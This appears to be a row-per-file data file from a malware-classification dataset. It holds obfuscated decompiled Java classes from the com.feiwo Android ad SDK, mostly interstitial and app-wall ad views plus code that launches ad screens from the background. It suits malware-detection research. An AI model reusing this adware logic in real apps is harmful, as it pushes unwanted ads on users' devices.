this.c.a(com.feiwo.c.a.v + i2,userInfo);   }   public synchronized void a(  int i,  com.feiwo.view.a.b bVar){     if (this.c != null) {       RootNode<TableplaqueAdInfo> d=d(e(i));       d.getAd().setShowStyle(Integer.valueOf(i));       a(com.feiwo.c.a.A,d,new u(this,bVar));     }   }   @Override protected void a(  com.feiwo.f.a aVar){     aVar.a(new com.feiwo.e.a());   }   void a(  TableplaqueAdInfo tableplaqueAdInfo){     if (tableplaqueAdInfo.getShowStyle().intValue() == 2) {       TableplaqueAdInfo tableplaqueAdInfo2=(TableplaqueAdInfo)a(this.c,(List<?>)this.c.a(com.feiwo.c.a.u + 2,com.feiwo.c.b(o())),tableplaqueAdInfo.getAdId());       if (tableplaqueAdInfo2 != null) {         String tablePlaqueImg=tableplaqueAdInfo2.getTablePlaqueImg();         if (TextUtils.isEmpty(tablePlaqueImg)) {           c(tableplaqueAdInfo2.getAdId().intValue());         }  else {           com.feiwo.i.b.a.a().a(n(),w(),com.feiwo.i.c.b.a(tablePlaqueImg),new r(this));         }       }     }   }   @Override public Type b(){     return new w(this).getType();   }   @Override public TypeToken<RootNode<TableplaqueAdInfo>> c(){     return new x(this);   }   @Override public void c(  int i){     int[] iArr={1,2};     int i2=0;     while (true) {       int i3=i2;       if (i3 >= iArr.length) {         return;       }       String str=com.feiwo.c.a.u + iArr[i3];       this.c.b(str,a((List)this.c.a(str,com.feiwo.c.b(o())),i),Integer.parseInt(r().getCacheExpires()));       i2=i3 + 1;     }   }   public int e(  int i){     UserInfo userInfo=(UserInfo)this.c.a(com.feiwo.c.a.v + i,new q(this).getType());     if (userInfo == null) {       userInfo=new UserInfo();     }     return userInfo.lastAdId;   }   @Override public int i(){     super.i();     f=null;     this.h=null;     return A();   }   @Override public int init(  Context context,  String str){     int init=super.init(context,str);     this.h=new Intent();     this.h.setClass(context,IA.class);     a(true);     return init;   }   public void y(){     a(1,new s(this));   }   public void z(){     a(2,new t(this));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\InterstitialView.code","public class InterstitialView extends RelativeLayout implements GestureDetector.OnGestureListener, View.OnTouchListener {   private final String f214a;   private final int f215b;   private final int c;   private final int d;   private float e;   private int f;   private int g;   private GestureDetector h;   private ViewFlipper i;   private InterstitialBusinssDirector j;   private com.feiwo.b.a.f k;   private View l;   private RelativeLayout m;   private RelativeLayout n;   private LinearLayout o;   private RelativeLayout p;   private DMCustomView q;   private ae r;   private LinearLayout s;   private List<TableplaqueAdInfo> t;   private Handler u;   private Runnable v;   public InterstitialView(  Context context,  View view){     super(context);     this.f214a=InterstitialView.class.getSimpleName();     this.f215b=420;     this.c=300;     this.d=4324;     this.e=1.4f;     this.g=0;     this.l=view;     f();   }   private long a(  TableplaqueAdInfo tableplaqueAdInfo){     if (tableplaqueAdInfo.getShowTime() != null) {       return tableplaqueAdInfo.getShowTime().intValue() * b.a.a.f.f12b;     }     return 15000L;   }   public synchronized void a(  int i){     if (IA.f212a) {       b();       this.t=(List)this.k.a(com.feiwo.c.a.u + 1,com.feiwo.c.b(this.j.o()));       if (this.t == null || this.g <= this.t.size()) {         this.j.a(1,new ad(this));       }  else       if (i() == null) {         FwInterstitialManager.close();       }     }   }   public void a(  TableplaqueAdInfo tableplaqueAdInfo,  Drawable drawable){     boolean z=false;     if (i() == null || i().getAdId().intValue() != tableplaqueAdInfo.getAdId().intValue()) {       int i=0;       while (true) {         if (i >= this.i.getChildCount()) {           break;         }         if (((TableplaqueAdInfo)((ImageView)this.i.getChildAt(i)).getTag()).getAdId().intValue() == tableplaqueAdInfo.getAdId().intValue()) {           z=true;           break;         }         i++;       }       if (!z) {         ImageView imageView=new ImageView(getContext());         imageView.setImageDrawable(drawable);         imageView.setScaleType(ImageView.ScaleType.FIT_XY);         ScreenSize a2=com.feiwo.i.b.e.a(getContext(),com.feiwo.i.b.e.a(getContext(),420.0f),com.feiwo.i.b.e.a(getContext(),300.0f));         int screenWidth=a2.getScreenWidth();         int screenHeight=a2.getScreenHeight();         RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-1);         this.p.setLayoutParams(layoutParams);         imageView.setLayoutParams(layoutParams);         RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(this.f + screenWidth,this.f + screenHeight);         layoutParams2.addRule(13);         this.m.setLayoutParams(layoutParams2);         this.i.addView(imageView);         imageView.setTag(tableplaqueAdInfo);         RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(screenWidth,screenHeight);         int a3=com.feiwo.i.b.e.a(getContext(),this.f / 3);         layoutParams3.setMargins(a3,a3,a3,a3);         this.o.setLayoutParams(layoutParams3);       }       if (this.t != null && this.t.size() > 1) {         this.i.setInAnimation(com.feiwo.i.b.c());         this.i.setOutAnimation(com.feiwo.i.b.b());         this.i.showNext();         b();       }       this.j.a(tableplaqueAdInfo,1);     }   }   public void a(  boolean z){     if (!z) {       b();       this.p.setVisibility(4);       return;     }     h();     if (i() != null) {       if (i().getKind().intValue() == 2) {         this.q.setImages(com.feiwo.i.c.a.bi,com.feiwo.i.c.a.bj);       }  else {         this.q.setImages(com.feiwo.i.c.a.bi,com.feiwo.i.c.a.bi);       }     }     this.p.setVisibility(0);   }   private synchronized Handler d(){     if (this.u == null) {       this.u=new Handler();     }     return this.u;   }   public static int e(  InterstitialView interstitialView){     int i=interstitialView.g;     interstitialView.g=i + 1;     return i;   }   private synchronized Runnable e(){     if (this.v == null) {       this.v=new y(this);     }     return this.v;   }   private void f(){     this.g=0;     this.j=InterstitialBusinssDirector.x();     this.k=this.j.c;     this.h=new GestureDetector(getContext(),this);     this.n=new RelativeLayout(getContext());     this.n.setBackgroundColor(0);     this.m=new RelativeLayout(getContext());     this.m.setId(4324);     this.m.setBackgroundColor(0);     this.p=new RelativeLayout(getContext());     this.o=new LinearLayout(getContext());     this.o.setGravity(17);     this.o.setBackgroundColor(Color.parseColor(""#66000000""));     this.p.setBackgroundColor(Color.parseColor(""#99000000""));     this.i=new ViewFlipper(getContext());     this.i.setOnTouchListener(this);     this.n.setBackgroundColor(0);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-1);     layoutParams.addRule(13);     this.i.setLayoutParams(layoutParams);     this.n.addView(this.i);     if (this.l != null) {       this.l.setOnClickListener(new z(this));     }     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(getContext(),127.0f),com.feiwo.i.b.e.a(getContext(),47.0f));     layoutParams2.addRule(14);     layoutParams2.addRule(12);     layoutParams2.bottomMargin=com.feiwo.i.b.e.a(getContext(),45.0f);     this.q=new DMCustomView(getContext());     this.q.setLayoutParams(layoutParams2);     this.q.setImages(com.feiwo.i.c.a.bi,com.feiwo.i.c.a.bj);     this.q.setOnClickListener(new aa(this));     this.p.addView(this.q);     this.s=new LinearLayout(getContext());     this.s.setGravity(5);     Button button=new Button(getContext().getApplicationContext());     button.setBackgroundDrawable(new BitmapDrawable(com.feiwo.i.b.f.b(getContext().getApplicationContext(),com.feiwo.i.c.a.bk)));     int a2=com.feiwo.i.b.e.a(getContext(),r1.getWidth() / 2);     this.f=((int)(a2 * this.e)) / 2;     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-1,-2);     layoutParams3.setMargins(this.f / 2,this.f / 2,this.f / 2,this.f / 2);     this.s.setLayoutParams(layoutParams3);     button.setLayoutParams(new RelativeLayout.LayoutParams(a2,a2));     button.setOnClickListener(new ab(this));     this.s.addView(button);     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);     layoutParams4.setMargins(this.f,this.f,this.f,this.f);     this.n.setLayoutParams(layoutParams4);     this.p.setOnClickListener(new ac(this));     this.m.addView(this.n);     this.m.addView(this.s);     this.n.addView(this.p);     this.p.setVisibility(4);     addView(this.m);     setRound();     a(this.j.e(1));   }   private boolean g(){     return i() != null && ((i().getWifiSwitches() != null && com.feiwo.i.u.a(this.j.n(),i()).getClickDown().isOn()) || i().getKind().intValue() == 1);   }   public void h(){     if (d() != null) {       d().removeCallbacks(e());     }   }   public TableplaqueAdInfo i(){     if (this.i == null || this.i.getChildCount() == 0) {       return null;     }     return (TableplaqueAdInfo)((ImageView)this.i.getChildAt(this.i.getDisplayedChild())).getTag();   }   public ae a(){     return this.r;   }   public void b(){     h();     if (d() == null || i() == null) {       return;     }     d().postDelayed(e(),a(i()));   }   public void c(){     h();   }   @Override public boolean onDown(  MotionEvent motionEvent){     return false;   }   @Override public boolean onFling(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     if (motionEvent2.getX() - motionEvent.getX() > 120.0f) {       if (this.i.getChildCount() > 1) {         this.i.setInAnimation(com.feiwo.i.b.a());         this.i.setOutAnimation(com.feiwo.i.b.d());         this.i.showPrevious();         this.j.a(i(),1);         b();       }     }  else     if (motionEvent2.getX() - motionEvent.getX() < -120.0f) {       a(this.j.e(1));     }     return true;   }   @Override public void onLongPress(  MotionEvent motionEvent){   }   @Override public boolean onScroll(  MotionEvent motionEvent,  MotionEvent motionEvent2,  float f,  float f2){     return false;   }   @Override public void onShowPress(  MotionEvent motionEvent){   }   @Override public boolean onSingleTapUp(  MotionEvent motionEvent){     if (g()) {       this.j.b(i());       return false;     }     a(true);     return false;   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     this.h.onTouchEvent(motionEvent);     return true;   }   public void setFilterViewListener(  ae aeVar){     this.r=aeVar;   }   public void setRound(){     ScreenSize a2=com.feiwo.i.b.e.a(getContext(),com.feiwo.i.b.e.a(getContext(),420.0f),com.feiwo.i.b.e.a(getContext(),300.0f));     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(a2.getScreenWidth() + this.f,a2.getScreenHeight() + this.f);     layoutParams.addRule(13);     this.m.setLayoutParams(layoutParams);     this.m.setLayoutParams(layoutParams);     this.o.setLayoutParams(layoutParams);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\j.code","public class j implements View.OnClickListener {   final i f247a;   public j(  i iVar){     this.f247a=iVar;   }   @Override public void onClick(  View view){     TableplaqueAdInfo tableplaqueAdInfo;     InterstitialBusinssDirector x=InterstitialBusinssDirector.x();     tableplaqueAdInfo=this.f247a.h;     x.b(tableplaqueAdInfo);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\k.code","public class k implements com.feiwo.view.a.b {   final i f248a;   public k(  i iVar){     this.f248a=iVar;   }   @Override public void a(  com.feiwo.f.a.h hVar){   }   @Override public void a(  com.feiwo.f.a.h hVar,  TableplaqueAdInfo tableplaqueAdInfo,  Drawable drawable){     ImageView imageView;     InterstitialBusinssDirector interstitialBusinssDirector;     Handler handler;     InterstitialBusinssDirector interstitialBusinssDirector2;     Handler handler2;     Runnable runnable;     imageView=this.f248a.c;     if (imageView == null) {       return;     }     if (drawable != null) {       handler=this.f248a.i;       if (handler != null) {         this.f248a.h=tableplaqueAdInfo;         this.f248a.d();         this.f248a.a(drawable);         interstitialBusinssDirector2=this.f248a.f;         interstitialBusinssDirector2.a(tableplaqueAdInfo,2);         long intValue=tableplaqueAdInfo.getShowTime() != null ? tableplaqueAdInfo.getShowTime().intValue() * b.a.a.f.f12b : 5000L;         handler2=this.f248a.i;         runnable=this.f248a.j;         handler2.postDelayed(runnable,intValue);         return;       }     }     this.f248a.g();     interstitialBusinssDirector=this.f248a.f;     interstitialBusinssDirector.a(tableplaqueAdInfo.getAdId().intValue(),2);   }   @Override public void a(  TableplaqueAdInfo tableplaqueAdInfo){     this.f248a.g();   }   @Override public void b(  com.feiwo.f.a.h hVar){     this.f248a.g();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\l.code","public class l implements Runnable {   final i f249a;   public l(  i iVar){     this.f249a=iVar;   }   @Override public void run(){     DMCustomView dMCustomView;     ImageView imageView;     DMCustomView dMCustomView2;     Animation e=com.feiwo.i.b.e();     e.setAnimationListener(new m(this));     dMCustomView=this.f249a.d;     if (dMCustomView != null) {       dMCustomView2=this.f249a.d;       dMCustomView2.startAnimation(e);     }     imageView=this.f249a.c;     imageView.startAnimation(e);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\LV.code","!org.eclipse.jdt.core.dom.TypeDeclaration@42e4cab6"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\m.code","class m implements Animation.AnimationListener {   final l f250a;   public m(  l lVar){     this.f250a=lVar;   }   @Override public void onAnimationEnd(  Animation animation){     this.f250a.f249a.g();   }   @Override public void onAnimationRepeat(  Animation animation){   }   @Override public void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\n.code","public class n extends BroadcastReceiver {   final IA f251a;   public n(  IA ia){     this.f251a=ia;   }   @Override public void onReceive(  Context context,  Intent intent){     af afVar;     af afVar2;     if (intent.getAction().equals(com.feiwo.c.a.G)) {       afVar=this.f251a.h;       if (afVar == null) {         this.f251a.a();         this.f251a.finish();         return;       }       ScaleAnimation scaleAnimation=new ScaleAnimation(1.0f,0.0f,1.0f,0.0f);       scaleAnimation.setFillAfter(true);       scaleAnimation.setDuration(500L);       scaleAnimation.setAnimationListener(new o(this));       afVar2=this.f251a.h;       afVar2.b().startAnimation(scaleAnimation);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\o.code","class o implements Animation.AnimationListener {   final n f252a;   public o(  n nVar){     this.f252a=nVar;   }   @Override public void onAnimationEnd(  Animation animation){     this.f252a.f251a.a();     this.f252a.f251a.finish();   }   @Override public void onAnimationRepeat(  Animation animation){   }   @Override public void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\p.code","class p implements com.feiwo.view.a.a {   final IA f253a;   public p(  IA ia){     this.f253a=ia;   }   @Override public void a(){     this.f253a.finish();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\q.code","public class q extends TypeToken<UserInfo> {   final InterstitialBusinssDirector f254a;   public q(  InterstitialBusinssDirector interstitialBusinssDirector){     this.f254a=interstitialBusinssDirector;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\r.code","public class r implements com.feiwo.i.b.d {   final InterstitialBusinssDirector f255a;   public r(  InterstitialBusinssDirector interstitialBusinssDirector){     this.f255a=interstitialBusinssDirector;   }   @Override public void a(  Drawable drawable,  String str){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\RFloorView.code","public class RFloorView extends RelativeLayout {   public RFloorView(  Context context){     super(context);     a(context);   }   private void a(  Context context){     setBackgroundColor(-1);     ImageView imageView=new ImageView(context);     imageView.setId(1001);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(context,65.3f),com.feiwo.i.b.e.a(context,64.0f));     layoutParams.addRule(11);     layoutParams.setMargins(0,0,0,com.feiwo.i.b.e.a(context,3.3f));     layoutParams.addRule(15);     imageView.setLayoutParams(layoutParams);     imageView.setBackgroundDrawable(com.feiwo.i.b.f.a(context,com.feiwo.i.c.a.cx));     LinearLayout linearLayout=new LinearLayout(context);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,com.feiwo.i.b.e.a(context,44.0f));     layoutParams2.addRule(15);     layoutParams2.addRule(0,1001);     layoutParams2.setMargins(com.feiwo.i.b.e.a(context,26.6f),0,com.feiwo.i.b.e.a(context,13.3f),0);     linearLayout.setLayoutParams(layoutParams2);     linearLayout.setOrientation(1);     TextView textView=new TextView(context);     new RelativeLayout.LayoutParams(-1,-2);     textView.setGravity(48);     textView.setText(com.feiwo.i.c.a.cu);     textView.setTextSize(20.0f);     textView.setTextColor(Color.rgb(128,53,0));     TextView textView2=new TextView(context);     textView2.setText(com.feiwo.i.c.a.cv);     textView2.setTextSize(12.0f);     textView2.setTextColor(Color.rgb(67,142,214));     linearLayout.addView(textView);     linearLayout.addView(textView2);     addView(imageView);     addView(linearLayout);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\RitemsView.code","public class RitemsView extends RelativeLayout {   public RitemsView(  Context context){     super(context);     a(context);   }   private void a(  Context context){     RelativeLayout relativeLayout=new RelativeLayout(context);     relativeLayout.setLayoutParams(new RelativeLayout.LayoutParams(-1,com.feiwo.i.b.e.a(context,66.0f)));     ImageView imageView=new ImageView(context);     imageView.setId(39312);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(context,40.0f),com.feiwo.i.b.e.a(context,40.0f));     layoutParams.addRule(15);     layoutParams.setMargins(com.feiwo.i.b.e.a(context,13.3f),0,0,0);     imageView.setLayoutParams(layoutParams);     ImageView imageView2=new ImageView(context);     imageView.setId(39313);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(context,10.6f),com.feiwo.i.b.e.a(context,18.6f));     layoutParams2.addRule(15);     layoutParams2.addRule(11);     layoutParams2.setMargins(0,0,com.feiwo.i.b.e.a(context,13.3f),0);     imageView2.setLayoutParams(layoutParams);     TextView textView=new TextView(context);     textView.setId(39314);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(0,39313);     layoutParams3.addRule(1,39312);     layoutParams3.addRule(6,39312);     layoutParams3.setMargins(com.feiwo.i.b.e.a(context,13.3f),com.feiwo.i.b.e.a(context,2.0f),com.feiwo.i.b.e.a(context,13.3f),0);     textView.setLayoutParams(layoutParams3);     textView.setSingleLine();     textView.setTextColor(Color.rgb(76,76,76));     textView.setTextSize(18.6f);     TextView textView2=new TextView(context);     textView2.setId(39315);     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);     layoutParams4.addRule(0,39313);     layoutParams4.addRule(1,39312);     layoutParams4.addRule(3,39314);     layoutParams4.setMargins(com.feiwo.i.b.e.a(context,13.3f),0,com.feiwo.i.b.e.a(context,13.3f),0);     textView2.setLayoutParams(layoutParams4);     textView2.setSingleLine();     textView2.setTextSize(12.0f);     textView2.setTextColor(Color.rgb(102,102,102));     relativeLayout.addView(imageView);     relativeLayout.addView(imageView2);     relativeLayout.addView(textView);     relativeLayout.addView(textView2);     addView(relativeLayout);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\RLoadfailview.code","public class RLoadfailview extends RelativeLayout {   public RLoadfailview(  Context context){     super(context);     a(context);   }   private void a(  Context context){     setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     LinearLayout linearLayout=new LinearLayout(context);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(14);     layoutParams.setMargins(0,com.feiwo.i.b.e.a(context,13.3f),0,0);     linearLayout.setLayoutParams(layoutParams);     linearLayout.setOrientation(0);     ImageView imageView=new ImageView(context);     imageView.setLayoutParams(new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(context,40.0f),com.feiwo.i.b.e.a(context,40.0f)));     imageView.setBackgroundDrawable(com.feiwo.i.b.f.a(context,com.feiwo.i.c.a.cj));     TextView textView=new TextView(context);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.setMargins(com.feiwo.i.b.e.a(context,13.3f),0,0,0);     textView.setLayoutParams(layoutParams2);     textView.setGravity(17);     textView.setTextColor(Color.rgb(153,153,153));     textView.setTextSize(16.0f);     textView.setText(com.feiwo.i.c.a.ck + ""\n"" + com.feiwo.i.c.a.cl);     linearLayout.addView(imageView);     linearLayout.addView(textView);     addView(linearLayout);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\RlodingView.code","public class RlodingView extends RelativeLayout {   private static final String f218a=RlodingView.class.getName();   private Context f219b;   private final int c;   private final int d;   private int e;   private ImageView f;   private Timer g;   private Handler h;   public RlodingView(  Context context){     super(context);     this.c=1118224;     this.d=2265752;     this.h=new ak(this);     this.f219b=context;     setLayoutParams(new RelativeLayout.LayoutParams(-1,com.feiwo.i.b.e.a(context,264.0f)));     a();   }   private void a(){     TextView textView=new TextView(this.f219b);     textView.setId(2265752);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-1,-2);     layoutParams.addRule(14);     textView.setLayoutParams(layoutParams);     textView.setGravity(17);     textView.setText(com.feiwo.i.c.a.y);     textView.setTextSize(16.0f);     textView.setTextColor(Color.rgb(153,153,153));     textView.setPadding(0,com.feiwo.i.b.e.a(this.f219b,13.3f),0,0);     addView(textView);     this.f=new ImageView(this.f219b);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(com.feiwo.i.b.e.a(this.f219b,62.6f),com.feiwo.i.b.e.a(this.f219b,12.0f));     layoutParams2.addRule(14);     layoutParams2.setMargins(0,com.feiwo.i.b.e.a(this.f219b,13.3f),0,0);     layoutParams2.addRule(3,2265752);     this.f.setLayoutParams(layoutParams2);     this.f.setBackgroundDrawable(com.feiwo.i.b.f.a(this.f219b,com.feiwo.i.c.a.ce));     addView(this.f);   }   private void b(){     this.g=new Timer();     this.g.schedule(new al(this),0L,300L);   }   public static int c(  RlodingView rlodingView){     int i=rlodingView.e;     rlodingView.e=i + 1;     return i;   }   @Override protected void onAttachedToWindow(){     super.onAttachedToWindow();     b();   }   @Override protected void onDetachedFromWindow(){     super.onDetachedFromWindow();     if (this.g != null) {       this.g.cancel();       this.g=null;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\Rview.code","public class Rview extends RelativeLayout implements AdapterView.OnItemClickListener {   private static final String f220a=Rview.class.getName();   private ListView f221b;   private RlodingView c;   private RLoadfailview d;   private ImageView e;   private Context f;   private int g;   private int h;   private com.feiwo.a.d i;   private Handler j;   public Rview(  Context context){     super(context);     this.j=new am(this);     this.f=context;     b();   }   public Rview(  Context context,  int i,  int i2){     super(context);     this.j=new am(this);     this.f=context;     this.h=i2;     this.g=i;     b();   }   public Rview(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.j=new am(this);     this.f=context;     b();   }   public Rview(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     this.j=new am(this);     this.f=context;     b();   }   private View a(  Context context){     if (this.c == null) {       this.c=new RlodingView(context);     }     return this.c;   }   public void a(  List<AppWallAdInfo> list){     removeAllViews();     this.c=null;     RFloorView rFloorView=new RFloorView(this.f);     rFloorView.setLayoutParams(new AbsListView.LayoutParams(-1,com.feiwo.i.b.e.a(this.f,72.0f)));     this.f221b.addFooterView(rFloorView);     this.f221b.setLayoutParams(new RelativeLayout.LayoutParams(-1,com.feiwo.i.b.e.a(this.f,(list.size() * 66) + 72)));     this.i=new com.feiwo.a.d(this.f,list,this.g);     this.f221b.setAdapter((ListAdapter)this.i);     addView(this.f221b);   }   private void b(){     addView(a(this.f));     this.f221b=new ListView(this.f);     this.f221b.setId(110);     this.f221b.setCacheColorHint(0);     this.f221b.setDivider(com.feiwo.i.b.f.a(this.f,com.feiwo.i.c.a.ar));     this.f221b.setDividerHeight(com.feiwo.i.b.e.a(this.f,1.0f));     this.f221b.setOnItemClickListener(this);     this.d=new RLoadfailview(this.f);     com.feiwo.g.b.a(this.f).a(this.g,this.h,1,this.j);     this.e=new ImageView(this.f);     this.e.setLayoutParams(new AbsListView.LayoutParams(-1,-2));     this.e.setBackgroundDrawable(com.feiwo.i.b.f.a(this.f,com.feiwo.i.c.a.cw));   }   public void c(){     removeAllViews();   }   public void d(){   }   public void a(){     if (this.i != null) {       this.i.a();     }   }   @Override public void onItemClick(  AdapterView<?> adapterView,  View view,  int i,  long j){     if (i + 1 >= adapterView.getAdapter().getCount()) {       this.f.startActivity(com.feiwo.h.b.a(this.f));     }  else {       AppWallAdInfo appWallAdInfo=(AppWallAdInfo)adapterView.getAdapter().getItem(i);       this.f.startActivity(com.feiwo.h.b.a(this.f,appWallAdInfo,ReDictory.x().w(),5));       ReDictory.x().b(appWallAdInfo);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\s.code","public class s implements com.feiwo.view.a.b {   final InterstitialBusinssDirector f256a;   public s(  InterstitialBusinssDirector interstitialBusinssDirector){     this.f256a=interstitialBusinssDirector;   }   @Override public void a(  com.feiwo.f.a.h hVar){   }   @Override public void a(  com.feiwo.f.a.h hVar,  TableplaqueAdInfo tableplaqueAdInfo,  Drawable drawable){     Intent intent;     Intent intent2;     Intent intent3;     intent=this.f256a.h;     intent.putExtra(com.feiwo.c.a.E,1);     intent2=this.f256a.h;     intent2.addFlags(268435456);     Context n=this.f256a.n();     intent3=this.f256a.h;     n.startActivity(intent3);   }   @Override public void a(  TableplaqueAdInfo tableplaqueAdInfo){   }   @Override public void b(  com.feiwo.f.a.h hVar){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\t.code","public class t implements com.feiwo.view.a.b {   final InterstitialBusinssDirector f257a;   public t(  InterstitialBusinssDirector interstitialBusinssDirector){     this.f257a=interstitialBusinssDirector;   }   @Override public void a(  com.feiwo.f.a.h hVar){   }   @Override public void a(  com.feiwo.f.a.h hVar,  TableplaqueAdInfo tableplaqueAdInfo,  Drawable drawable){     Intent intent;     Intent intent2;     Intent intent3;     if (drawable != null) {       intent=this.f257a.h;       intent.putExtra(com.feiwo.c.a.E,2);       intent2=this.f257a.h;       intent2.addFlags(268435456);       Context n=this.f257a.n();       intent3=this.f257a.h;       n.startActivity(intent3);     }   }   @Override public void a(  TableplaqueAdInfo tableplaqueAdInfo){   }   @Override public void b(  com.feiwo.f.a.h hVar){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\TextProgressBar.code","public class TextProgressBar extends ProgressBar {   private String f222a;   private Paint f223b;   public TextProgressBar(  Context context){     super(context);     a();   }   public TextProgressBar(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     a();   }   public TextProgressBar(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     a();   }   private void a(){     this.f223b=new Paint();     this.f223b.setAntiAlias(true);     this.f223b.setColor(SupportMenu.CATEGORY_MASK);   }   private void a(  int i){     this.f222a=String.valueOf(i) + ""%"";   }   @Override protected synchronized void onDraw(  Canvas canvas){     super.onDraw(canvas);     this.f223b.getTextBounds(this.f222a,0,this.f222a.length(),new Rect());     canvas.drawText(this.f222a,(getWidth() / 2) - r0.centerX(),(getHeight() / 2) - r0.centerY(),this.f223b);   }   @Override public void setProgress(  int i){     a(i);     super.setProgress(i);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.view\u.code","public class u implements com.feiwo.f.a.g {   final com.feiwo.view.a.b f258a;   final InterstitialBusinssDirector f259b;   public u(  InterstitialBusinssDirector interstitialBusinssDirector,  com.feiwo.view.a.b bVar){     this.f259b=interstitialBusinssDirector;     this.f258a=bVar;   }   @Override public void a(  com.feiwo.f.a.h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){     if (this.f259b.n() == null) {       return;     }     this.f258a.a(hVar);     if (this.f259b.a(rootNode2)) {       this.f258a.b(hVar);       return;     }     TableplaqueAdInfo tableplaqueAdInfo=(TableplaqueAdInfo)rootNode2.getAd().getAdList().get(0);     String tablePlaqueImg=tableplaqueAdInfo.getTablePlaqueImg();     if (!TextUtils.isEmpty(tablePlaqueImg)) {       com.feiwo.i.b.a.a().a(this.f259b.n(),this.f259b.w(),com.feiwo.i.c.b.a(tablePlaqueImg),new v(this,hVar,tableplaqueAdInfo));     }  else {       this.f258a.a(tableplaqueAdInfo);       this.f259b.c(tableplaqueAdInfo.getAdId().intValue());     }   } } "
